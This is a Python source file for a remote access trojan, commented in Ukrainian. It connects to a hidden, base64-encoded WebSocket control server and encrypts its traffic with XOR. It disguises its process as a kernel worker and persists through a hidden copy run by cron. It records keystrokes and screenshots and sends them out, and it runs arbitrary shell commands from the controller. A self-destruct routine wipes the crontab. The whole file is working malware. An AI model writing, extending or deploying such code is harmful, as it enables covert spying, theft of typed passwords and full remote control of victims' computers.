import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import shutil
import glob
import io
from io import BytesIO

try: import setproctitle
except: setproctitle = None
try: from PIL import ImageGrab
except: ImageGrab = None
try: from pynput import keyboard
except: keyboard = None

# Конфігурація
_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
FAKE_NAME = "[kworker/u2:1-events]"

log_buffer = []
current_dir = os.getcwd()

def get_url(): 
    try:
        return base64.b64decode(_S).decode()
    except:
        return ""

def crypt_logic(d):
    k = X_KEY
    return "".join(chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in range(len(d)))

def decrypt(m):
    try: 
        decoded = base64.b64decode(m).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(m): 
    return base64.b64encode(crypt_logic(m).encode()).decode()

def masquerade():
    if setproctitle: 
        setproctitle.setproctitle(FAKE_NAME)
    else:
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
        except: pass

def ghost_install():
    try:
        p = os.path.expanduser("~/.local/share/systemd-service")
        os.makedirs(p, exist_ok=True)
        t = os.path.join(p, "sys-update")
        if not os.path.exists(t):
            shutil.copy2(sys.argv[0], t)
            os.chmod(t, 0o755)
            c = f"*/2 * * * * {t} >/dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{c}") | crontab -', shell=True)
    except: pass

def take_screenshot_sync():
    """Покращений метод захоплення екрана для Linux"""
    if not ImageGrab:
        return None
    try:
        # Налаштування оточення для X11
        if 'DISPLAY' not in os.environ:
            os.environ['DISPLAY'] = ':0'
        
        # Вирішення проблеми з доступом root до сесії користувача
        if os.getuid() == 0:
            # Шукаємо .Xauthority у домашніх папках користувачів
            auth_paths = glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']
            for path in auth_paths:
                if os.path.exists(path):
                    os.environ['XAUTHORITY'] = path
                    break

        # Спроба зробити знімок
        # Важливо: у системі МАЄ бути встановлений scrot (apt install scrot)
        screenshot = ImageGrab.grab()
        if screenshot:
            buf = io.BytesIO()
            screenshot.save(buf, format="PNG")
            return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        print(f"DEBUG Error: {e}") # Можна прибрати в продакшні
        return None
    return None

async def run_shell(cmd):
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        o, e = await proc.communicate()
        res = o.decode() + e.decode()
        return f"{os.getlogin()}:{os.getcwd()}:$ {res}" if res else "Command executed (no output)."
    except Exception as ex:
        return f"Error: {str(ex)}"

async def keylog_sender(ws):
    global log_buffer
    while True:
        await asyncio.sleep(20)
        if log_buffer:
            data = "".join(log_buffer)
            await ws.send(encrypt(f"LOGS:{data}"))
            log_buffer = []

def on_press(key):
    try: log_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space: log_buffer.append(" ")
        elif key == keyboard.Key.enter: log_buffer.append("\n")
        else: log_buffer.append(f"[{key.name}]")

async def start():
    masquerade()
    ghost_install()
    
    if keyboard:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

    b_id = str(uuid.uuid4())[:8]
    
    while True:
        try:
            url = get_url()
            if not url: 
                await asyncio.sleep(10)
                continue
                
            async with websockets.connect(url + b_id, ping_interval=None) as ws:
                asyncio.create_task(keylog_sender(ws))
                while True:
                    m = await ws.recv()
                    cmd = decrypt(m)
                    if not cmd: continue
                    cmd = cmd.strip()
                    
                    if cmd == "screenshot":
                        # Використовуємо thread для запобігання блокуванню event loop
                        shot_b64 = await asyncio.to_thread(take_screenshot_sync)
                        if shot_b64:
                            await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
                        else:
                            # Додаткова діагностика для вас
                            await ws.send(encrypt("SYS_MSG: Screenshot failed. Check if 'scrot' is installed."))
                            
                    elif cmd == "steal":
                        await ws.send(encrypt("SYS_MSG: Stealer initiated..."))
                        # Логіка збору файлів може бути додана тут
                        await ws.send(encrypt("SYS_MSG: Stealer finished (Placeholder)."))
                        
                    elif cmd == "self_destruct":
                        subprocess.run("crontab -r", shell=True)
                        os._exit(0)
                    else:
                        response = await run_shell(cmd)
                        await ws.send(encrypt(response))
        except Exception:
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(start())